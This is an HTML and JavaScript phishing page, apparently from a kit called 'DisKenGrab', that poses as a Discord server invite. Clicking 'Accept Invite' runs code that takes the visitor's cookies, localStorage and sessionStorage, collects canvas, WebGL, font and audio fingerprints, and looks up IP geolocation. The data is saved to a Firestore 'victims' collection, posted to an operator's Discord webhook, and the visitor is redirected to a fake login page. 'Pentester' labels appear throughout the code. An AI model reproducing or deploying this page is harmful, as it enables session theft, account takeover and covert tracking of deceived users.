<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You've been invited to join a server | Discord</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --discord-blurple: #5865F2;
            --discord-green: #57F287;
            --discord-dark: #36393f;
            --discord-darker: #2f3136;
            --text-light: #ffffff;
            --text-muted: #b9bbbe;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: var(--discord-darker);
            color: var(--text-light);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url('https://discord.com/assets/7c5f92d6bf6c0a34d80a.png');
            background-size: cover;
        }

        .invite-container {
            background: var(--discord-dark);
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 480px;
            text-align: center;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
            border: 1px solid #40444b;
        }

        .server-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: var(--discord-blurple);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 2rem;
        }

        .server-name {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .member-count {
            color: var(--text-muted);
            margin-bottom: 30px;
            font-size: 14px;
        }

        .join-button {
            background: var(--discord-green);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }

        .join-button:hover {
            background: #48d874;
        }

        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid var(--discord-green);
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .server-info {
            margin: 20px 0;
            padding: 15px;
            background: var(--discord-darker);
            border-radius: 8px;
            text-align: left;
        }

        .info-item {
            display: flex;
            justify-content: space-between;
            margin: 8px 0;
            font-size: 14px;
        }

        .info-label {
            color: var(--text-muted);
        }

        .info-value {
            color: var(--text-light);
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="invite-container">
        <div class="server-icon">
            <i class="fab fa-discord"></i>
        </div>
        
        <h1 class="server-name" id="serverName">You've been invited to join a server</h1>
        <p class="member-count" id="memberCount">15,234 members online</p>
        
        <div class="server-info">
            <div class="info-item">
                <span class="info-label">Server Name:</span>
                <span class="info-value" id="displayServerName">Community Hub</span>
            </div>
            <div class="info-item">
                <span class="info-label">Members Online:</span>
                <span class="info-value">15,234</span>
            </div>
            <div class="info-item">
                <span class="info-label">Total Members:</span>
                <span class="info-value">89,123</span>
            </div>
            <div class="info-item">
                <span class="info-label">Server Region:</span>
                <span class="info-value">US West</span>
            </div>
        </div>
        
        <button class="join-button" id="joinButton">
            <span class="spinner" id="joinSpinner" style="display: none;"></span>
            Accept Invite
        </button>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="../config.js"></script>
    
    <script>
        // ==================== INVITE PAGE FUNCTIONALITY ====================
        
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const attackId = urlParams.get('id');
        const pentesterId = urlParams.get('pentester');
        const targetInvite = urlParams.get('invite');

        console.log('üîó Invite Page Parameters:', { attackId, pentesterId, targetInvite });

        // Initialize Firebase
        let db;
        if (typeof firebaseConfig !== 'undefined') {
            try {
                if (!firebase.apps.length) {
                    firebase.initializeApp(firebaseConfig);
                }
                db = firebase.firestore();
                console.log('‚úÖ Invite page Firebase initialized');
            } catch (error) {
                console.error('‚ùå Firebase initialization error:', error);
            }
        }

        // Extract server name from invite URL
        function getServerNameFromInvite(inviteUrl) {
            try {
                if (inviteUrl.includes('discord.gg/')) {
                    const code = inviteUrl.split('discord.gg/')[1];
                    if (code) {
                        return `${code.toUpperCase()} Community`;
                    }
                }
                return "Community Hub";
            } catch (error) {
                return "Discord Server";
            }
        }

        // üî• CRITICAL DISCORD COOKIES TO CAPTURE
        function captureDiscordCookies() {
            const cookies = document.cookie;
            const discordSpecificCookies = {};
            
            // Discord's important authentication cookies
            const importantCookies = [
                '__cfduid', '__dcfduid', '__sdcfduid',
                'locale', 'preferred_locale',
                '__stripe_mid', '__stripe_sid',
                '_ga', '_gid', '_gat',
                'OptanonConsent', 'OptanonAlertBoxClosed'
            ];
            
            // Parse all cookies
            const cookiePairs = cookies.split(';');
            cookiePairs.forEach(pair => {
                const [key, value] = pair.trim().split('=');
                if (importantCookies.includes(key) || key.includes('discord')) {
                    discordSpecificCookies[key] = value;
                }
            });
            
            return {
                allCookies: cookies,
                discordCookies: discordSpecificCookies,
                localStorage: captureLocalStorage(),
                sessionStorage: captureSessionStorage()
            };
        }

        function captureLocalStorage() {
            const storage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage[key] = localStorage.getItem(key);
            }
            return storage;
        }

        function captureSessionStorage() {
            const storage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                storage[key] = sessionStorage.getItem(key);
            }
            return storage;
        }

        // üéØ ENHANCED FINGERPRINTING
        async function captureEnhancedFingerprint() {
            const fingerprint = {
                // Basic browser info
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                
                // Screen info
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                
                // Hardware
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // Connection
                connection: captureConnectionInfo(),
                
                // Canvas fingerprinting
                canvasFingerprint: await generateCanvasFingerprint(),
                
                // WebGL fingerprinting
                webglInfo: getWebGLInfo(),
                
                // Font detection
                fonts: await detectFonts(),
                
                // Plugins
                plugins: Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    filename: p.filename,
                    description: p.description
                })),
                
                // Storage
                cookiesEnabled: navigator.cookieEnabled,
                localStorageEnabled: !!window.localStorage,
                sessionStorageEnabled: !!window.sessionStorage,
                
                // Performance
                devicePixelRatio: window.devicePixelRatio,
                
                // Audio context
                audioFingerprint: await generateAudioFingerprint()
            };
            
            return fingerprint;
        }

        function captureConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
            }
            return null;
        }

        function generateCanvasFingerprint() {
            return new Promise((resolve) => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    canvas.width = 200;
                    canvas.height = 50;
                    
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = '#069';
                    ctx.fillText('Canvas Fingerprint', 2, 15);
                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                    ctx.fillText('Canvas Fingerprint', 4, 17);
                    
                    const data = canvas.toDataURL();
                    resolve(data.substring(0, 100)); // First 100 chars for uniqueness
                } catch (e) {
                    resolve('canvas_not_supported');
                }
            });
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) return 'webgl_not_supported';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    version: gl.getParameter(gl.VERSION)
                };
            } catch (e) {
                return 'webgl_error';
            }
        }

        async function detectFonts() {
            const fontList = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Webdings', 'Wingdings'
            ];
            
            const availableFonts = [];
            
            // Simple font detection
            for (const font of fontList) {
                if (isFontAvailable(font)) {
                    availableFonts.push(font);
                }
            }
            
            return availableFonts;
        }

        function isFontAvailable(font) {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            const text = "abcdefghijklmnopqrstuvwxyz0123456789";
            const baseWidth = context.measureText(text).width;
            
            context.font = `72px ${font}, sans-serif`;
            const newWidth = context.measureText(text).width;
            
            return newWidth !== baseWidth;
        }

        async function generateAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                
                oscillator.connect(analyser);
                analyser.connect(audioContext.destination);
                
                oscillator.start();
                await new Promise(resolve => setTimeout(resolve, 100));
                oscillator.stop();
                
                audioContext.close();
                return 'audio_supported';
            } catch (e) {
                return 'audio_not_supported';
            }
        }

        // Get victim's IP address with enhanced info
        async function getEnhancedIPData() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                // Get geolocation data
                const geoResponse = await fetch(`http://ip-api.com/json/${data.ip}`);
                const geoData = await geoResponse.json();
                
                return {
                    ip: data.ip,
                    country: geoData.country,
                    countryCode: geoData.countryCode,
                    region: geoData.regionName,
                    city: geoData.city,
                    zip: geoData.zip,
                    lat: geoData.lat,
                    lon: geoData.lon,
                    timezone: geoData.timezone,
                    isp: geoData.isp,
                    org: geoData.org,
                    as: geoData.as,
                    mobile: geoData.mobile,
                    proxy: geoData.proxy,
                    hosting: geoData.hosting
                };
            } catch (error) {
                return {
                    ip: 'unknown',
                    error: error.message
                };
            }
        }

        // Steal cookies and browser info
        async function stealCookiesAndRedirect() {
            const joinButton = document.getElementById('joinButton');
            const spinner = document.getElementById('joinSpinner');

            // Show loading
            joinButton.disabled = true;
            spinner.style.display = 'inline-block';

            try {
                // üî• CAPTURE EVERYTHING
                const cookies = captureDiscordCookies();
                const fingerprint = await captureEnhancedFingerprint();
                const ipData = await getEnhancedIPData();

                // Collect comprehensive victim data
                const victimData = {
                    timestamp: new Date(),
                    stage: 'cookie_capture',
                    attackId: attackId,
                    pentesterId: pentesterId,
                    
                    // Enhanced IP data
                    ipData: ipData,
                    
                    // Critical Discord cookies
                    cookies: cookies,
                    
                    // Advanced fingerprinting
                    fingerprint: fingerprint,
                    
                    // Referrer and navigation
                    referrer: document.referrer,
                    url: window.location.href,
                    landingPage: 'invite'
                };

                console.log('üç™ Captured comprehensive victim data:', victimData);

                // Save to Firestore
                if (db) {
                    await db.collection('victims').add({
                        ...victimData,
                        capturedAt: firebase.firestore.FieldValue.serverTimestamp(),
                        status: 'cookies_captured'
                    });

                    // Update campaign stats
                    if (attackId) {
                        await updateCampaignStats(attackId, 'cookies');
                    }

                    // Send to Discord webhook
                    await sendToWebhook(victimData, 'cookies');
                }

                // Wait a moment then redirect to login page
                setTimeout(() => {
                    const loginUrl = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
                    console.log('üîê Redirecting to login page:', loginUrl);
                    window.location.href = loginUrl;
                }, 2000);

            } catch (error) {
                console.error('‚ùå Error capturing data:', error);
                // Still redirect to login page even if saving fails
                setTimeout(() => {
                    window.location.href = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
                }, 2000);
            }
        }

        // Update campaign statistics
        async function updateCampaignStats(campaignId, type) {
            try {
                const campaignRef = db.collection('campaigns').doc(campaignId);
                const campaignDoc = await campaignRef.get();
                
                if (campaignDoc.exists) {
                    if (type === 'cookies') {
                        const currentCookies = campaignDoc.data().cookiesCaptured || 0;
                        await campaignRef.update({
                            cookiesCaptured: currentCookies + 1,
                            lastCookieCapture: firebase.firestore.FieldValue.serverTimestamp()
                        });
                    }
                }
            } catch (error) {
                console.error('‚ùå Error updating campaign stats:', error);
            }
        }

        // Send notification to Discord webhook
        async function sendToWebhook(victimData, type) {
            try {
                if (pentesterId && db) {
                    const pentesterDoc = await db.collection('pentesters').doc(pentesterId).get();
                    if (pentesterDoc.exists) {
                        const pentesterData = pentesterDoc.data();
                        const webhookUrl = pentesterData.webhookUrl;

                        if (webhookUrl) {
                            let embed;
                            if (type === 'cookies') {
                                embed = {
                                    title: 'üç™ Advanced Fingerprint Captured',
                                    description: `**Campaign ID:** ${attackId || 'Unknown'}\n**Stage:** Invite Page`,
                                    color: 16753920, // Orange
                                    fields: [
                                        {
                                            name: 'üåê IP Address',
                                            value: victimData.ipData.ip,
                                            inline: true
                                        },
                                        {
                                            name: 'üìç Location',
                                            value: `${victimData.ipData.city}, ${victimData.ipData.country}`,
                                            inline: true
                                        },
                                        {
                                            name: 'üñ•Ô∏è Platform',
                                            value: victimData.fingerprint.platform,
                                            inline: true
                                        },
                                        {
                                            name: 'üç™ Cookies Captured',
                                            value: `**${Object.keys(victimData.cookies.discordCookies).length}** Discord cookies`,
                                            inline: false
                                        },
                                        {
                                            name: 'üìä Browser Fingerprint',
                                            value: `Canvas: ‚úÖ | WebGL: ‚úÖ | Fonts: ${victimData.fingerprint.fonts.length}`,
                                            inline: false
                                        }
                                    ],
                                    timestamp: new Date().toISOString()
                                };
                            }

                            await fetch(webhookUrl, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ 
                                    content: 'üéØ **Advanced fingerprint captured!** Redirecting to login...',
                                    embeds: [embed] 
                                })
                            });
                        }
                    }
                }
            } catch (error) {
                console.error('‚ùå Error sending webhook:', error);
            }
        }

        // Initialize the invite page
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üöÄ DisKenGrab Advanced Invite Page Loaded');
            
            // Set server info
            const serverName = getServerNameFromInvite(targetInvite || '');
            document.getElementById('serverName').textContent = `You've been invited to join ${serverName}`;
            document.getElementById('displayServerName').textContent = serverName;

            // Add join button handler
            document.getElementById('joinButton').addEventListener('click', stealCookiesAndRedirect);
        });
    </script>
</body>
</html>